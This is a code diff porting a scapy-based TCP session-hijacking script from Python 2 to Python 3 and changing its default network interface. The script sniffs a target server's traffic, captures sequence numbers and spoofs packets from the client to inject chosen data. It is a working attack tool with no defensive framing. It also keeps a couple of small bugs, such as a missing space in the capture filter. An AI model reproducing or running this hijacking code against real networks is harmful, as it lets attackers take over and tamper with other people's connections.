@@ -1,11 +1,11 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import sys
 import getopt
 from scapy.all import send, sniff, IP, TCP
 
 
-dev = "eth0"
+dev = "enp3s0f1"
 srv_port = None
 srv_ip = None
 client_ip = None
@@ -19,11 +19,11 @@ def handle_packet(packet):
     tcp = packet.getlayer("TCP")
     flags = tcp.sprintf("%flags%")
 
-    print "Got packet %s:%d -> %s:%d [%s]" % (ip.src,
+    print("Got packet %s:%d -> %s:%d [%s]" % (ip.src,
                                               tcp.sport,
                                               ip.dst,
                                               tcp.dport,
-                                              flags)
+                                              flags))
 
     # Check if this is a hijackable packet
     if tcp.sprintf("%flags%") == "A" or \
@@ -36,14 +36,14 @@ def handle_packet(packet):
            ip.src == srv_ip and \
            not already_hijacked:
 
-            print "Got server sequence " + str(tcp.seq)
-            print "Got client sequence " + str(tcp.ack) + "\n"
+            print("Got server sequence " + str(tcp.seq))
+            print("Got client sequence " + str(tcp.ack) + "\n")
 
             # Found the payload?
             if grep in str(tcp.payload):
                 hijack_data.setdefault(ip.dst, {})\
                             ['hijack'] = True
-                print "Found payload " + str(tcp.payload)
+                print("Found payload " + str(tcp.payload))
             elif not grep:
                 hijack_data.setdefault(ip.dst, {})\
                             ['hijack'] = True
@@ -51,10 +51,10 @@ def handle_packet(packet):
             if hijack_data.setdefault(ip.dst, {})\
                           .get('hijack'):
 
-                print "Hijacking %s:%d -> %s:%d" % (ip.dst,
+                print("Hijacking %s:%d -> %s:%d" % (ip.dst,
                                                     tcp.dport,
                                                     ip.src,
-                                                    srv_port)
+                                                    srv_port))
 
                 # Spoof packet from client
                 packet = IP(src=ip.dst, dst=ip.src) / \
@@ -71,15 +71,15 @@ def handle_packet(packet):
 
 
 def usage():
-    print sys.argv[0]
-    print """
+    print(sys.argv[0])
+    print("""
     -c <client_ip> (optional)
     -d <data_to_inject> (optional)
     -g <payload_to_grep> (optional)
     -i <interface> (optional)
     -p <srv_port>
     -s <srv_ip>
-    """
+    """)
     sys.exit(1)
 
 try:
@@ -108,18 +108,18 @@ if not srv_ip and not srv_port:
     usage()
 
 if client_ip:
-    print "Hijacking TCP connections from %s to " + \
+    print("Hijacking TCP connections from %s to " + \
           "%s on port %d" % (client_ip,
                              srv_ip,
-                             srv_port)
+                             srv_port))
 
     filter = "tcp and port " + str(srv_port) + \
              " and host " + srv_ip + \
              "and host " + client_ip
 else:
-    print "Hijacking all TCP connections to " + \
+    print("Hijacking all TCP connections to " + \
     "%s on port %d" % (srv_ip,
-                       srv_port)
+                       srv_port))
 
     filter = "tcp and port " + str(srv_port) + \
              " and host " + srv_ip
